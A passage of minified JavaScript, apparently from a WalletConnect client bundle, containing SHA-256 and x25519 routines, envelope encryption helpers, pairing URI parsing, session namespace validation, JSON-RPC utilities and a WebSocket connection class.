h=J0[d-15],f=J0[d-2],p=Uu(h,7)^Uu(h,18)^h>>>3,g=Uu(f,17)^Uu(f,19)^f>>>10;J0[d]=g+J0[d-7]+p+J0[d-16]|0}let{A:i,B:n,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let d=0;d<64;d++){const h=Uu(a,6)^Uu(a,11)^Uu(a,25),f=u+h+q4e(a,c,l)+H4e[d]+J0[d]|0,p=(Uu(i,2)^Uu(i,13)^Uu(i,22))+z4e(i,n,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=n,n=i,i=f+p|0}i=i+this.A|0,n=n+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(i,n,s,o,a,c,l,u)}roundClean(){J0.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}};const cC=BQ(()=>new V4e);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const GQ=BigInt(0);function pR(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function ZQ(r){if(!pR(r))throw new Error("Uint8Array expected")}const K4e=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function G4e(r){ZQ(r);let e="";for(let t=0;t<r.length;t++)e+=K4e[r[t]];return e}function Z4e(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?GQ:BigInt("0x"+r)}const fh={_0:48,_9:57,A:65,F:70,a:97,f:102};function rj(r){if(r>=fh._0&&r<=fh._9)return r-fh._0;if(r>=fh.A&&r<=fh.F)return r-(fh.A-10);if(r>=fh.a&&r<=fh.f)return r-(fh.a-10)}function YQ(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=rj(r.charCodeAt(s)),a=rj(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function ij(r){return ZQ(r),Z4e(G4e(Uint8Array.from(r).reverse()))}function Y4e(r,e){return YQ(r.toString(16).padStart(e*2,"0"))}function J4e(r,e){return Y4e(r,e).reverse()}function nj(r,e,t){let i;if(typeof e=="string")try{i=YQ(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if(pR(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}const qS=r=>typeof r=="bigint"&&GQ<=r;function Q4e(r,e,t){return qS(r)&&qS(e)&&qS(t)&&e<=r&&r<t}function sj(r,e,t,i){if(!Q4e(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}const X4e={bigint:r=>typeof r=="bigint",function:r=>typeof r=="function",boolean:r=>typeof r=="boolean",string:r=>typeof r=="string",stringOrUint8Array:r=>typeof r=="string"||pR(r),isSafeInteger:r=>Number.isSafeInteger(r),array:r=>Array.isArray(r),field:(r,e)=>e.Fp.isValid(r),hash:r=>typeof r=="function"&&Number.isSafeInteger(r.outputLen)};function e6e(r,e,t={}){const i=(n,s,o)=>{const a=X4e[s];if(typeof a!="function")throw new Error("invalid validator function");const c=r[n];if(!(o&&c===void 0)&&!a(c,r))throw new Error("param "+String(n)+" is invalid. Expected "+s+", got "+c)};for(const[n,s]of Object.entries(e))i(n,s,!1);for(const[n,s]of Object.entries(t))i(n,s,!0);return r}const Vm=BigInt(0),J6=BigInt(1);function JQ(r,e){const t=r%e;return t>=Vm?t:e+t}function t6e(r,e,t){if(e<Vm)throw new Error("invalid exponent, negatives unsupported");if(t<=Vm)throw new Error("invalid modulus");if(t===J6)return Vm;let i=J6;for(;e>Vm;)e&J6&&(i=i*r%t),r=r*r%t,e>>=J6;return i}function Jl(r,e,t){let i=r;for(;e-- >Vm;)i*=i,i%=t;return i}BigInt(0),BigInt(1),BigInt(0),BigInt(1),BigInt(2),BigInt(8);const F2=BigInt(0),zS=BigInt(1);function r6e(r){return e6e(r,{a:"bigint"},{montgomeryBits:"isSafeInteger",nByteLength:"isSafeInteger",adjustScalarBytes:"function",domain:"function",powPminus2:"function",Gu:"bigint"}),Object.freeze({...r})}function i6e(r){const e=r6e(r),{P:t}=e,i=x=>JQ(x,t),n=e.montgomeryBits,s=Math.ceil(n/8),o=e.nByteLength,a=e.adjustScalarBytes||(x=>x),c=e.powPminus2||(x=>t6e(x,t-BigInt(2),t));function l(x,S,T){const k=i(x*(S-T));return S=i(S-k),T=i(T+k),[S,T]}const u=(e.a-BigInt(2))/BigInt(4);function d(x,S){sj("u",x,F2,t),sj("scalar",S,F2,t);const T=S,k=x;let I=zS,E=F2,C=x,N=zS,L=F2,$;for(let A=BigInt(n-1);A>=F2;A--){const b=T>>A&zS;L^=b,$=l(L,I,C),I=$[0],C=$[1],$=l(L,E,N),E=$[0],N=$[1],L=b;const v=I+E,_=i(v*v),O=I-E,D=i(O*O),R=_-D,P=C+N,B=C-N,M=i(B*v),W=i(P*O),K=M+W,q=M-W;C=i(K*K),N=i(k*i(q*q)),I=i(_*D),E=i(R*(_+i(u*R)))}$=l(L,I,C),I=$[0],C=$[1],$=l(L,E,N),E=$[0],N=$[1];const y=c(E);return i(I*y)}function h(x){return J4e(i(x),s)}function f(x){const S=nj("u coordinate",x,s);return o===32&&(S[31]&=127),ij(S)}function p(x){const S=nj("scalar",x),T=S.length;if(T!==s&&T!==o){let k=""+s+" or "+o;throw new Error("invalid scalar, expected "+k+" bytes, got "+T)}return ij(a(S))}function g(x,S){const T=f(S),k=p(x),I=d(T,k);if(I===F2)throw new Error("invalid private or public key received");return h(I)}const w=h(e.Gu);function m(x){return g(x,w)}return{scalarMult:g,scalarMultBase:m,getSharedSecret:(x,S)=>g(x,S),getPublicKey:x=>m(x),utils:{randomPrivateKey:()=>e.randomBytes(e.nByteLength)},GuBytes:w}}const Tk=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949");BigInt(0);const n6e=BigInt(1),oj=BigInt(2),s6e=BigInt(3),o6e=BigInt(5);BigInt(8);function a6e(r){const e=BigInt(10),t=BigInt(20),i=BigInt(40),n=BigInt(80),s=Tk,o=r*r%s*r%s,a=Jl(o,oj,s)*o%s,c=Jl(a,n6e,s)*r%s,l=Jl(c,o6e,s)*c%s,u=Jl(l,e,s)*l%s,d=Jl(u,t,s)*u%s,h=Jl(d,i,s)*d%s,f=Jl(h,n,s)*h%s,p=Jl(f,n,s)*h%s,g=Jl(p,e,s)*l%s;return{pow_p_5_8:Jl(g,oj,s)*r%s,b2:o}}function c6e(r){return r[0]&=248,r[31]&=127,r[31]|=64,r}const kk=i6e({P:Tk,a:BigInt(486662),montgomeryBits:255,nByteLength:32,Gu:BigInt(9),powPminus2:r=>{const e=Tk,{pow_p_5_8:t,b2:i}=a6e(r);return JQ(Jl(t,s6e,e)*i,e)},adjustScalarBytes:c6e,randomBytes:f4}),QQ="base10",Mo="base16",Rf="base64pad",bb="base64url",p4="utf8",XQ=0,e0=1,g4=2,l6e=0,aj=1,_5=12,gR=32;function u6e(){const r=kk.utils.randomPrivateKey(),e=kk.getPublicKey(r);return{privateKey:Fi(r,Mo),publicKey:Fi(e,Mo)}}function Nk(){const r=f4(gR);return Fi(r,Mo)}function d6e(r,e){const t=kk.getSharedSecret(En(r,Mo),En(e,Mo)),i=j4e(cC,t,void 0,void 0,gR);return Fi(i,Mo)}function c9(r){const e=cC(En(r,Mo));return Fi(e,Mo)}function Lh(r){const e=cC(En(r,p4));return Fi(e,Mo)}function eX(r){return En(`${r}`,QQ)}function Q1(r){return Number(Fi(r,QQ))}function h6e(r){const e=eX(typeof r.type<"u"?r.type:XQ);if(Q1(e)===e0&&typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");const t=typeof r.senderPublicKey<"u"?En(r.senderPublicKey,Mo):void 0,i=typeof r.iv<"u"?En(r.iv,Mo):f4(_5),n=En(r.symKey,Mo),s=VQ(n,i).encrypt(En(r.message,p4));return tX({type:e,sealed:s,iv:i,senderPublicKey:t,encoding:r.encoding})}function f6e(r){const e=En(r.symKey,Mo),{sealed:t,iv:i}=Vv(r),n=VQ(e,i).decrypt(t);if(n===null)throw new Error("Failed to decrypt");return Fi(n,p4)}function p6e(r,e){const t=eX(g4),i=f4(_5),n=En(r,p4);return tX({type:t,sealed:n,iv:i,encoding:e})}function g6e(r,e){const{sealed:t}=Vv({encoded:r,encoding:e});return Fi(t,p4)}function tX(r){const{encoding:e=Rf}=r;if(Q1(r.type)===g4)return Fi(qf([r.type,r.sealed]),e);if(Q1(r.type)===e0){if(typeof r.senderPublicKey>"u")throw new Error("Missing sender public key for type 1 envelope");return Fi(qf([r.type,r.senderPublicKey,r.iv,r.sealed]),e)}return Fi(qf([r.type,r.iv,r.sealed]),e)}function Vv(r){const{encoded:e,encoding:t=Rf}=r,i=En(e,t),n=i.slice(l6e,aj),s=aj;if(Q1(n)===e0){const l=s+gR,u=l+_5,d=i.slice(s,l),h=i.slice(l,u),f=i.slice(u);return{type:n,sealed:f,iv:h,senderPublicKey:d}}if(Q1(n)===g4){const l=i.slice(s),u=f4(_5);return{type:n,sealed:l,iv:u}}const o=s+_5,a=i.slice(s,o),c=i.slice(o);return{type:n,sealed:c,iv:a}}function m6e(r,e){const t=Vv({encoded:r,encoding:e?.encoding});return rX({type:Q1(t.type),senderPublicKey:typeof t.senderPublicKey<"u"?Fi(t.senderPublicKey,Mo):void 0,receiverPublicKey:e?.receiverPublicKey})}function rX(r){const e=r?.type||XQ;if(e===e0){if(typeof r?.senderPublicKey>"u")throw new Error("missing sender public key");if(typeof r?.receiverPublicKey>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:r?.senderPublicKey,receiverPublicKey:r?.receiverPublicKey}}function cj(r){return r.type===e0&&typeof r.senderPublicKey=="string"&&typeof r.receiverPublicKey=="string"}function lj(r){return r.type===g4}function w6e(r){return new nye.ec("p256").keyFromPublic({x:Buffer.from(r.x,"base64").toString("hex"),y:Buffer.from(r.y,"base64").toString("hex")},"hex")}function b6e(r){let e=r.replace(/-/g,"+").replace(/_/g,"/");const t=e.length%4;return t>0&&(e+="=".repeat(4-t)),e}function v6e(r){return Buffer.from(b6e(r),"base64")}function y6e(r,e){const[t,i,n]=r.split("."),s=v6e(n);if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32).toString("hex"),a=s.slice(32,64).toString("hex"),c=`${t}.${i}`,l=cC(c),u=w6e(e),d=Fi(l,Mo);if(!u.verify(d,{r:o,s:a}))throw new Error("Invalid signature");return u0(r).payload}const x6e="irn";function l7(r){return r?.relay||{protocol:x6e}}function r5(r){const e=cR[r];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${r}`);return e}function C6e(r,e="-"){const t={},i="relay"+e;return Object.keys(r).forEach(n=>{if(n.startsWith(i)){const s=n.replace(i,""),o=r[n];t[s]=o}}),t}function uj(r){if(!r.includes("wc:")){const l=RQ(r);l!=null&&l.includes("wc:")&&(r=l)}r=r.includes("wc://")?r.replace("wc://",""):r,r=r.includes("wc:")?r.replace("wc:",""):r;const e=r.indexOf(":"),t=r.indexOf("?")!==-1?r.indexOf("?"):void 0,i=r.substring(0,e),n=r.substring(e+1,t).split("@"),s=typeof t<"u"?r.substring(t):"",o=new URLSearchParams(s),a={};o.forEach((l,u)=>{a[u]=l});const c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:i,topic:E6e(n[0]),version:parseInt(n[1],10),symKey:a.symKey,relay:C6e(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function E6e(r){return r.startsWith("//")?r.substring(2):r}function _6e(r,e="-"){const t="relay",i={};return Object.keys(r).forEach(n=>{const s=t+e+n;r[n]&&(i[s]=r[n])}),i}function dj(r){const e=new URLSearchParams,t=_6e(r.relay);Object.keys(t).sort().forEach(n=>{e.set(n,t[n])}),e.set("symKey",r.symKey),r.expiryTimestamp&&e.set("expiryTimestamp",r.expiryTimestamp.toString()),r.methods&&e.set("methods",r.methods.join(","));const i=e.toString();return`${r.protocol}:${r.topic}@${r.version}?${i}`}function Q6(r,e,t){return`${r}?wc_ev=${t}&topic=${e}`}function A3(r){const e=[];return r.forEach(t=>{const[i,n]=t.split(":");e.push(`${i}:${n}`)}),e}function S6e(r){const e=[];return Object.values(r).forEach(t=>{e.push(...A3(t.accounts))}),e}function A6e(r,e){const t=[];return Object.values(r).forEach(i=>{A3(i.accounts).includes(e)&&t.push(...i.methods)}),t}function I6e(r,e){const t=[];return Object.values(r).forEach(i=>{A3(i.accounts).includes(e)&&t.push(...i.events)}),t}function mR(r){return r.includes(":")}function i5(r){return mR(r)?r.split(":")[0]:r}function T6e(r){const e={};return r?.forEach(t=>{const[i,n]=t.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[]}),e[i].accounts.push(t),e[i].chains.push(`${i}:${n}`)}),e}function hj(r,e){e=e.map(i=>i.replace("did:pkh:",""));const t=T6e(e);for(const[i,n]of Object.entries(t))n.methods?n.methods=o9(n.methods,r):n.methods=r,n.events=["chainChanged","accountsChanged"];return t}const k6e={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},N6e={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function st(r,e){const{message:t,code:i}=N6e[r];return{message:e?`${t} ${e}`:t,code:i}}function Hi(r,e){const{message:t,code:i}=k6e[r];return{message:e?`${t} ${e}`:t,code:i}}function Pw(r,e){return!!Array.isArray(r)}function Kv(r){return Object.getPrototypeOf(r)===Object.prototype&&Object.keys(r).length}function Vo(r){return typeof r>"u"}function Zn(r,e){return e&&Vo(r)?!0:typeof r=="string"&&!!r.trim().length}function wR(r,e){return e&&Vo(r)?!0:typeof r=="number"&&!isNaN(r)}function P6e(r,e){const{requiredNamespaces:t}=e,i=Object.keys(r.namespaces),n=Object.keys(t);let s=!0;return v1(n,i)?(i.forEach(o=>{const{accounts:a,methods:c,events:l}=r.namespaces[o],u=A3(a),d=t[o];(!v1(AQ(o,d),u)||!v1(d.methods,c)||!v1(d.events,l))&&(s=!1)}),s):!1}function u7(r){return Zn(r,!1)&&r.includes(":")?r.split(":").length===2:!1}function $6e(r){if(Zn(r,!1)&&r.includes(":")){const e=r.split(":");if(e.length===3){const t=e[0]+":"+e[1];return!!e[2]&&u7(t)}}return!1}function R6e(r){function e(t){try{return typeof new URL(t)<"u"}catch{return!1}}try{if(Zn(r,!1)){if(e(r))return!0;const t=RQ(r);return e(t)}}catch{}return!1}function O6e(r){var e;return(e=r?.proposer)==null?void 0:e.publicKey}function B6e(r){return r?.topic}function M6e(r,e){let t=null;return Zn(r?.publicKey,!1)||(t=st("MISSING_OR_INVALID",`${e} controller public key should be a string`)),t}function fj(r){let e=!0;return Pw(r)?r.length&&(e=r.every(t=>Zn(t,!1))):e=!1,e}function D6e(r,e,t){let i=null;return Pw(e)&&e.length?e.forEach(n=>{i||u7(n)||(i=Hi("UNSUPPORTED_CHAINS",`${t}, chain ${n} should be a string and conform to "namespace:chainId" format`))}):u7(r)||(i=Hi("UNSUPPORTED_CHAINS",`${t}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),i}function L6e(r,e,t){let i=null;return Object.entries(r).forEach(([n,s])=>{if(i)return;const o=D6e(n,AQ(n,s),`${e} ${t}`);o&&(i=o)}),i}function U6e(r,e){let t=null;return Pw(r)?r.forEach(i=>{t||$6e(i)||(t=Hi("UNSUPPORTED_ACCOUNTS",`${e}, account ${i} should be a string and conform to "namespace:chainId:address" format`))}):t=Hi("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),t}function j6e(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=U6e(i?.accounts,`${e} namespace`);n&&(t=n)}),t}function F6e(r,e){let t=null;return fj(r?.methods)?fj(r?.events)||(t=Hi("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):t=Hi("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),t}function iX(r,e){let t=null;return Object.values(r).forEach(i=>{if(t)return;const n=F6e(i,`${e}, namespace`);n&&(t=n)}),t}function q6e(r,e,t){let i=null;if(r&&Kv(r)){const n=iX(r,e);n&&(i=n);const s=L6e(r,e,t);s&&(i=s)}else i=st("MISSING_OR_INVALID",`${e}, ${t} should be an object with data`);return i}function WS(r,e){let t=null;if(r&&Kv(r)){const i=iX(r,e);i&&(t=i);const n=j6e(r,e);n&&(t=n)}else t=st("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return t}function nX(r){return Zn(r.protocol,!0)}function z6e(r,e){let t=!1;return r?r&&Pw(r)&&r.length&&r.forEach(i=>{t=nX(i)}):t=!0,t}function W6e(r){return typeof r=="number"}function ma(r){return typeof r<"u"&&typeof r!==null}function H6e(r){return!(!r||typeof r!="object"||!r.code||!wR(r.code,!1)||!r.message||!Zn(r.message,!1))}function V6e(r){return!(Vo(r)||!Zn(r.method,!1))}function K6e(r){return!(Vo(r)||Vo(r.result)&&Vo(r.error)||!wR(r.id,!1)||!Zn(r.jsonrpc,!1))}function G6e(r){return!(Vo(r)||!Zn(r.name,!1))}function pj(r,e){return!(!u7(e)||!S6e(r).includes(e))}function Z6e(r,e,t){return Zn(t,!1)?A6e(r,e).includes(t):!1}function Y6e(r,e,t){return Zn(t,!1)?I6e(r,e).includes(t):!1}function gj(r,e,t){let i=null;const n=J6e(r),s=Q6e(e),o=Object.keys(n),a=Object.keys(s),c=mj(Object.keys(r)),l=mj(Object.keys(e)),u=c.filter(d=>!l.includes(d));return u.length&&(i=st("NON_CONFORMING_NAMESPACES",`${t} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),v1(o,a)||(i=st("NON_CONFORMING_NAMESPACES",`${t} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(d=>{if(!d.includes(":")||i)return;const h=A3(e[d].accounts);h.includes(d)||(i=st("NON_CONFORMING_NAMESPACES",`${t} namespaces accounts don't satisfy namespace accounts for ${d}
        Required: ${d}
        Approved: ${h.toString()}`))}),o.forEach(d=>{i||(v1(n[d].methods,s[d].methods)?v1(n[d].events,s[d].events)||(i=st("NON_CONFORMING_NAMESPACES",`${t} namespaces events don't satisfy namespace events for ${d}`)):i=st("NON_CONFORMING_NAMESPACES",`${t} namespaces methods don't satisfy namespace methods for ${d}`))}),i}function J6e(r){const e={};return Object.keys(r).forEach(t=>{var i;t.includes(":")?e[t]=r[t]:(i=r[t].chains)==null||i.forEach(n=>{e[n]={methods:r[t].methods,events:r[t].events}})}),e}function mj(r){return[...new Set(r.map(e=>e.includes(":")?e.split(":")[0]:e))]}function Q6e(r){const e={};return Object.keys(r).forEach(t=>{t.includes(":")?e[t]=r[t]:A3(r[t].accounts)?.forEach(n=>{e[n]={accounts:r[t].accounts.filter(s=>s.includes(`${n}:`)),methods:r[t].methods,events:r[t].events}})}),e}function X6e(r,e){return wR(r,!1)&&r<=e.max&&r>=e.min}function wj(){const r=h4();return new Promise(e=>{switch(r){case lc.browser:e(e8e());break;case lc.reactNative:e(t8e());break;case lc.node:e(r8e());break;default:e(!0)}})}function e8e(){return d4()&&navigator?.onLine}async function t8e(){return Sp()&&typeof global<"u"&&global!=null&&global.NetInfo?(await(global==null?void 0:global.NetInfo.fetch()))?.isConnected:!0}function r8e(){return!0}function i8e(r){switch(h4()){case lc.browser:n8e(r);break;case lc.reactNative:s8e(r);break}}function n8e(r){!Sp()&&d4()&&(window.addEventListener("online",()=>r(!0)),window.addEventListener("offline",()=>r(!1)))}function s8e(r){Sp()&&typeof global<"u"&&global!=null&&global.NetInfo&&global?.NetInfo.addEventListener(e=>r(e?.isConnected))}const HS={};let vb=class{static get(e){return HS[e]}static set(e,t){HS[e]=t}static delete(e){delete HS[e]}};const o8e="PARSE_ERROR",a8e="INVALID_REQUEST",c8e="METHOD_NOT_FOUND",l8e="INVALID_PARAMS",sX="INTERNAL_ERROR",bR="SERVER_ERROR",u8e=[-32700,-32600,-32601,-32602,-32603],S5={[o8e]:{code:-32700,message:"Parse error"},[a8e]:{code:-32600,message:"Invalid Request"},[c8e]:{code:-32601,message:"Method not found"},[l8e]:{code:-32602,message:"Invalid params"},[sX]:{code:-32603,message:"Internal error"},[bR]:{code:-32e3,message:"Server error"}},oX=bR;function d8e(r){return u8e.includes(r)}function bj(r){return Object.keys(S5).includes(r)?S5[r]:S5[oX]}function h8e(r){const e=Object.values(S5).find(t=>t.code===r);return e||S5[oX]}function aX(r,e,t){return r.message.includes("getaddrinfo ENOTFOUND")||r.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${t} RPC url at ${e}`):r}var VS={},ph={},vj;function f8e(){if(vj)return ph;vj=1,Object.defineProperty(ph,"__esModule",{value:!0}),ph.isBrowserCryptoAvailable=ph.getSubtleCrypto=ph.getBrowerCrypto=void 0;function r(){return Po?.crypto||Po?.msCrypto||{}}ph.getBrowerCrypto=r;function e(){const i=r();return i.subtle||i.webkitSubtle}ph.getSubtleCrypto=e;function t(){return!!r()&&!!e()}return ph.isBrowserCryptoAvailable=t,ph}var gh={},yj;function p8e(){if(yj)return gh;yj=1,Object.defineProperty(gh,"__esModule",{value:!0}),gh.isBrowser=gh.isNode=gh.isReactNative=void 0;function r(){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"}gh.isReactNative=r;function e(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}gh.isNode=e;function t(){return!r()&&!e()}return gh.isBrowser=t,gh}var xj;function g8e(){return xj||(xj=1,function(r){Object.defineProperty(r,"__esModule",{value:!0});const e=a4;e.__exportStar(f8e(),r),e.__exportStar(p8e(),r)}(VS)),VS}var m8e=g8e();function mn(r=3){const e=Date.now()*Math.pow(10,r),t=Math.floor(Math.random()*Math.pow(10,r));return e+t}function Cs(r=6){return BigInt(mn(r))}function jn(r,e,t){return{id:t||mn(),jsonrpc:"2.0",method:r,params:e}}function bl(r,e){return{id:r,jsonrpc:"2.0",result:e}}function Ap(r,e,t){return{id:r,jsonrpc:"2.0",error:w8e(e)}}function w8e(r,e){return typeof r>"u"?bj(sX):(typeof r=="string"&&(r=Object.assign(Object.assign({},bj(bR)),{message:r})),d8e(r.code)&&(r=h8e(r.code)),r)}let b8e=class{},v8e=class extends b8e{constructor(){super()}},y8e=class extends v8e{constructor(e){super()}};const x8e="^https?:",C8e="^wss?:";function E8e(r){const e=r.match(new RegExp(/^\w+:/,"gi"));if(!(!e||!e.length))return e[0]}function cX(r,e){const t=E8e(r);return typeof t>"u"?!1:new RegExp(e).test(t)}function Cj(r){return cX(r,x8e)}function Ej(r){return cX(r,C8e)}function _8e(r){return new RegExp("wss?://localhost(:d{2,5})?").test(r)}function lX(r){return typeof r=="object"&&"id"in r&&"jsonrpc"in r&&r.jsonrpc==="2.0"}function N0(r){return lX(r)&&"method"in r}function Jd(r){return lX(r)&&(Gi(r)||wi(r))}function Gi(r){return"result"in r}function wi(r){return"error"in r}let Vr=class extends y8e{constructor(e){super(e),this.events=new en.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async request(e,t){return this.requestStrict(jn(e.method,e.params||[],e.id||Cs().toString()),t)}async requestStrict(e,t){return new Promise(async(i,n)=>{if(!this.connection.connected)try{await this.open()}catch(s){n(s)}this.events.on(`${e.id}`,s=>{wi(s)?n(s.error):i(s.result)});try{await this.connection.send(e,t)}catch(s){n(s)}})}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),Jd(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&e.code===3e3&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),typeof e=="string"&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",e=>this.onPayload(e)),this.connection.on("close",e=>this.onClose(e)),this.connection.on("error",e=>this.events.emit("error",e)),this.connection.on("register_error",e=>this.onClose()),this.hasRegisteredEventListeners=!0)}};const S8e=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),A8e=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",_j=r=>r.split("?")[0],Sj=10,I8e=S8e();let vR=class{constructor(e){if(this.url=e,this.events=new en.EventEmitter,this.registering=!1,!Ej(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async open(e=this.url){await this.register(e)}async close(){return new Promise((e,t)=>{if(typeof this.socket>"u"){t(new Error("Connection already closed"));return}this.socket.onclose=i=>{this.onClose(i),e()},this.socket.close()})}async send(e){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(mu(e))}catch(t){this.onError(e.id,t)}}register(e=this.url){if(!Ej(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const t=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=t||this.events.listenerCount("open")>=t)&&this.events.setMaxListeners(t+1),new Promise((i,n)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),n(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return n(new Error("WebSocket connection is missing or invalid"));i(this.socket)})})}return this.url=e,this.registering=!0,new Promise((t,i)=>{const n=m8e.isReactNative()?void 0:{rejectUnauthorized:!_8e(e)},s=new I8e(e,[],n);A8e()?s.onerror=o=>{const a=o;i(this.emitError(a.error))}:s.on("error",o=>{i(this.emitError(o))}),s.onopen=()=>{this.onOpen(s),t(s)}})}onOpen(e){e.onmessage=t=>this.onPayload(t),e.onclose=t=>this.onClose(t),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const t=typeof e.data=="string"?gu(e.data):e.data;this.events.emit("payload",t)}onError(e,t){const i=this.parseError(t),n=i.message||i.toString(),s=Ap(e,n);this.events.emit("payload",s)}parseError(e,t=this.url){return aX(e,_j(t),"WS")}resetMaxListeners(){this.events.getMaxListeners()>Sj&&this.events.setMaxListeners(Sj)}emitError(e){const t=this.parseError(new Error(e?.message||`WebSocket connection failed for host: ${_j(this.url)}`));return this.events.emit("register_error",t),t}};var n5={exports:{}};n5.exports;var Aj;function T8e(){return Aj||(Aj=1,function(r,e){var 